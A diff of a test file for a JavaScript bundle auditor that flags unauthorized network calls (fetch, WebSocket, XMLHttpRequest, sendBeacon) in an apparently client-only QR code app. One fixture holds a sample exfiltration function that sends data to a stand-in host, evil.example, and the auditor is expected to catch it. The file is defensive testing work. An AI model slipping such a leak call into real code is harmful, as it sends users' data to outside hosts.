@@ -22,9 +22,9 @@ describe('bundle_ast_audit call-site authorization', () => {
     return auditFile(file, dist);
   };
 
-  it('allows fetch to an authorized first-party API prefix', () => {
-    expect(audit('client/assets/a.js', 'async function r(x){return fetch("/api/redirect/register",{method:"POST",body:x})}')).toEqual([]);
-    expect(audit('client/assets/b.js', 'function s(i){return fetch(`/api/redirect/stats?id=${i}`)}')).toEqual([]);
+  it('rejects fetch to any same-origin API path (QRCraftly has no server API)', () => {
+    expect(audit('client/assets/a.js', 'async function r(x){return fetch("/api/redirect/register",{method:"POST",body:x})}')).toHaveLength(1);
+    expect(audit('client/assets/b.js', 'function s(i){return fetch(`/api/anything?id=${i}`)}')).toHaveLength(1);
   });
 
   it('rejects the retired telemetry endpoint', () => {
@@ -37,7 +37,7 @@ describe('bundle_ast_audit call-site authorization', () => {
   });
 
   it('rejects fetch in a chunk where the authorizing text is only a comment', () => {
-    const code = '/* sanitizeSvg FileReader error xmlns="http://www.w3.org/2000/svg" /api/redirect/ */\nfunction leak(p){return fetch("https://evil.example/c?d="+p)}';
+    const code = '/* sanitizeSvg FileReader error xmlns="http://www.w3.org/2000/svg" */\nfunction leak(p){return fetch("https://evil.example/c?d="+p)}';
     const violations = audit('client/assets/e.js', code);
     expect(violations).toHaveLength(1);
     expect(violations[0].apiName).toBe('fetch');
@@ -48,12 +48,8 @@ describe('bundle_ast_audit call-site authorization', () => {
     expect(audit('client/assets/f.js', code)).toHaveLength(1);
   });
 
-  it('rejects a first-party prefix that is not at the start of the URL', () => {
-    expect(audit('client/assets/g.js', 'function x(){return fetch("https://evil.example/api/redirect/")}')).toHaveLength(1);
-  });
-
   it('still rejects WebSocket, XMLHttpRequest and sendBeacon everywhere, including authorized sites', () => {
-    const code = 'function w(){fetch("/api/redirect/x");new WebSocket("wss://x");new XMLHttpRequest();navigator.sendBeacon("/x","d")}';
+    const code = 'function w(){new WebSocket("wss://x");new XMLHttpRequest();navigator.sendBeacon("/x","d");throw new Error("Failed to download WebAssembly demuxer assets")}';
     const names = audit('client/assets/h.js', code).map(v => v.apiName).sort();
     expect(names).toEqual(['WebSocket', 'XMLHttpRequest', 'sendBeacon']);
   });
